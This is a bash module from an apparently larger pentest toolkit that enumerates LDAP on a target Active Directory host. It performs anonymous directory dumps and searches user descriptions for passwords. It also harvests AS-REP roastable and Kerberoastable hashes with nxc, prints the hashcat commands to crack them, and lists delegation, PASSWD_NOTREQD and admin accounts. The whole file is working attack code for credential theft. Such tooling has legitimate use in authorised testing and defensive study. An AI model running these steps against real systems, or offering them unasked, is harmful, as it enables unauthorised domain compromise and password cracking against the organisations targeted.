#!/usr/bin/env bash
# port_ldap.sh — Port 389/636 LDAP enumeration

enum_ldap() {
    local target="$1"
    progress "LDAP (389/636)"

    local NXC_LOCAL_FLAG=""
    $LOCAL_AUTH && NXC_LOCAL_FLAG="--local-auth"

    # ── ldapsearch anonymous bind ─────────────────────────────────────────────
    if command -v ldapsearch &>/dev/null; then
        info "Testing LDAP anonymous bind..."
        local ldap_base
        ldap_base=$(ldapsearch -x -H "ldap://${target}" -b '' -s base namingContexts 2>/dev/null | \
            grep -oP 'namingContexts:\s*\K.*' | head -1) || true

        if [[ -n "$ldap_base" ]]; then
            success "LDAP base DN: ${BOLD}${ldap_base}${RESET}"

            # rootDSE
            ldapsearch -x -H "ldap://${target}" -b '' -s base '*' '+' \
                > "${RECONDIR}/ldap-rootdse.txt" 2>&1 || true
            fix_owner "${RECONDIR}/ldap-rootdse.txt"

            # try full anonymous dump
            info "Attempting full LDAP anonymous dump..."
            ldapsearch -x -H "ldap://${target}" -b "$ldap_base" '(objectClass=*)' \
                > "${RECONDIR}/ldap-dump.txt" 2>&1 || true
            fix_owner "${RECONDIR}/ldap-dump.txt"
            rm_if_empty "${RECONDIR}/ldap-dump.txt"

            if [[ -s "${RECONDIR}/ldap-dump.txt" ]]; then
                local entry_count
                entry_count=$(grep -c '^dn:' "${RECONDIR}/ldap-dump.txt" || echo 0)
                if [[ "$entry_count" -gt 0 ]]; then
                    notify_finding "LDAP ANONYMOUS DUMP" \
                        "${entry_count} entries dumped" \
                        "Saved to: ${RECONDIR}/ldap-dump.txt"

                    # parse descriptions for passwords
                    local desc_hits
                    desc_hits=$(grep -iP 'description:.*pass|description:.*pwd|description:.*cred' \
                        "${RECONDIR}/ldap-dump.txt" 2>/dev/null | head -5) || true
                    if [[ -n "$desc_hits" ]]; then
                        notify_critical "POSSIBLE PASSWORDS IN LDAP DESCRIPTIONS" \
                            "$desc_hits"
                    fi
                fi
            fi
        else
            info "LDAP anonymous bind failed — no base DN returned."
        fi
    fi

    # ── nmap LDAP scripts ─────────────────────────────────────────────────────
    info "Running LDAP nmap scripts..."
    nmap -p 389,636 -Pn --script=ldap-rootdse,ldap-search \
        -oN "${RECONDIR}/ldap-nmap.txt" "$target" > /dev/null 2>&1 || true
    fix_owner "${RECONDIR}/ldap-nmap.txt"
    rm_if_empty "${RECONDIR}/ldap-nmap.txt"

    # ── nxc LDAP ──────────────────────────────────────────────────────────────
    if ! command -v nxc &>/dev/null; then
        warn "nxc not found — skipping nxc LDAP checks."
        return
    fi

    # ASREPRoast
    if [[ -s "${RECONDIR}/users.txt" ]]; then
        info "Testing ASREPRoast with user list..."
        nxc ldap "$target" -u "${RECONDIR}/users.txt" -p '' \
            $NXC_LOCAL_FLAG --asreproast "${RECONDIR}/asreproast.txt" > /dev/null 2>&1 || true
        rm_if_empty "${RECONDIR}/asreproast.txt"
        fix_owner "${RECONDIR}/asreproast.txt"

        if [[ -s "${RECONDIR}/asreproast.txt" ]]; then
            local asrep_count
            asrep_count=$(grep -c '$krb5asrep$' "${RECONDIR}/asreproast.txt" || true)
            if [[ "$asrep_count" -gt 0 ]]; then
                notify_critical "AS-REP ROASTABLE ACCOUNTS FOUND" \
                    "${asrep_count} account(s) without pre-auth" \
                    "Hashes: ${RECONDIR}/asreproast.txt" \
                    "Crack: hashcat -m 18200 asreproast.txt wordlist"
            else
                rm -f "${RECONDIR}/asreproast.txt"
            fi
        fi
    fi

    # Kerberoasting
    info "Testing Kerberoasting..."
    local kerb_user kerb_pass
    if $NULL_AUTH; then kerb_user=''; kerb_pass='';
    elif $GUEST_AUTH; then kerb_user='guest'; kerb_pass='';
    else kerb_user=''; kerb_pass=''; fi
    nxc ldap "$target" -u "$kerb_user" -p "$kerb_pass" $NXC_LOCAL_FLAG \
        --kerberoasting "${RECONDIR}/kerberoast.txt" 2>&1 | tr -d '\0' | log_verbose || true
    rm_if_empty "${RECONDIR}/kerberoast.txt"
    fix_owner "${RECONDIR}/kerberoast.txt"

    if [[ -s "${RECONDIR}/kerberoast.txt" ]]; then
        local kerb_count
        kerb_count=$(grep -c '$krb5tgs$' "${RECONDIR}/kerberoast.txt" || true)
        if [[ "$kerb_count" -gt 0 ]]; then
            notify_critical "KERBEROASTABLE ACCOUNTS FOUND" \
                "${kerb_count} service account(s) with SPNs" \
                "Hashes: ${RECONDIR}/kerberoast.txt" \
                "Crack: hashcat -m 13100 kerberoast.txt wordlist"
        else
            rm -f "${RECONDIR}/kerberoast.txt"
        fi
    fi

    # LDAP user enum fallback
    if [[ ! -s "${RECONDIR}/users.txt" ]]; then
        info "Trying LDAP user enumeration..."
        local ldap_user ldap_pass
        if $NULL_AUTH; then ldap_user=''; ldap_pass='';
        elif $GUEST_AUTH; then ldap_user='guest'; ldap_pass='';
        else ldap_user=''; ldap_pass=''; fi
        nxc ldap "$target" -u "$ldap_user" -p "$ldap_pass" $NXC_LOCAL_FLAG \
            --users --users-export "${RECONDIR}/users-ldap.txt" > /dev/null 2>&1 || true
        rm_if_empty "${RECONDIR}/users-ldap.txt"
        fix_owner "${RECONDIR}/users-ldap.txt"
        if [[ -s "${RECONDIR}/users-ldap.txt" ]]; then
            merge_users "${RECONDIR}/users-ldap.txt"
            local ldap_count
            ldap_count=$(wc -l < "${RECONDIR}/users-ldap.txt")
            success "LDAP user enum found ${BOLD}${ldap_count}${RESET} users"
        fi
    fi

    # Delegation, PASSWD_NOTREQD, adminCount
    if $NULL_AUTH || $GUEST_AUTH; then
        local deleg_user deleg_pass
        if $NULL_AUTH; then deleg_user=''; deleg_pass='';
        else deleg_user='guest'; deleg_pass=''; fi

        info "Checking delegation relationships..."
        local deleg_out
        deleg_out=$(nxc ldap "$target" -u "$deleg_user" -p "$deleg_pass" \
            $NXC_LOCAL_FLAG --find-delegation 2>&1 | tr -d '\0') || true
        if echo "$deleg_out" | sed 's/\x1b\[[0-9;]*m//g' | grep -qiP 'Unconstrained|Constrained|Resource'; then
            notify_finding "DELEGATION RELATIONSHIPS FOUND" \
                "$(echo "$deleg_out" | sed 's/\x1b\[[0-9;]*m//g' | grep -iP 'Unconstrained|Constrained|Resource' | head -5)"
        fi

        info "Checking PASSWD_NOTREQD accounts..."
        local pwnr_out
        pwnr_out=$(nxc ldap "$target" -u "$deleg_user" -p "$deleg_pass" \
            $NXC_LOCAL_FLAG --password-not-required 2>&1 | tr -d '\0') || true
        if echo "$pwnr_out" | sed 's/\x1b\[[0-9;]*m//g' | grep -P 'User:' | grep -qv -i 'disabled'; then
            notify_finding "PASSWD_NOTREQD ACCOUNTS" \
                "$(echo "$pwnr_out" | sed 's/\x1b\[[0-9;]*m//g' | grep -P 'User:' | head -5)"
        fi

        info "Checking adminCount=1 users..."
        local admin_out
        admin_out=$(nxc ldap "$target" -u "$deleg_user" -p "$deleg_pass" \
            $NXC_LOCAL_FLAG --admin-count 2>&1 | tr -d '\0') || true
        if echo "$admin_out" | sed 's/\x1b\[[0-9;]*m//g' | grep -qiP 'adminCount=1|User:.*admin'; then
            notify_finding "PRIVILEGED ACCOUNTS (adminCount=1)" \
                "$(echo "$admin_out" | sed 's/\x1b\[[0-9;]*m//g' | grep -iP 'adminCount|User:' | head -5)"
        fi
    fi
}
